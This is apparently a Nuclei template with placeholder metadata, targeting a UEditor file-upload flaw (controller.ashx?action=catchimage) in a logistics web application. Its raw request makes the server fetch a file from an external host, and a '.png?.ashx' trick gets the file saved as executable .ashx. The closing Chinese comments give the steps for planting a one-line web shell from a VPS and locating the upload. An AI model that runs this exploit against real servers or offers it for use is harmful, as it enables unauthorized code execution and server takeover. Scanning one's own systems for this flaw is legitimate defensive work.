id: zhinengwuliu-ueditor-upload

info:
  name: Template Name
  author: wangzong
  severity: critical
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |
        POST /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        Priority: u=1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 37

        source[]=http://{{interactsh-url}}/1.png?.ashx
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
#1.新建文件1.png,里面为 一句话
#2.上传vps启用http服务，并使用如上poc上传文件
#3返回包上传位置http://ip/upload/image/20240626/6385496269130997612204175.ashx
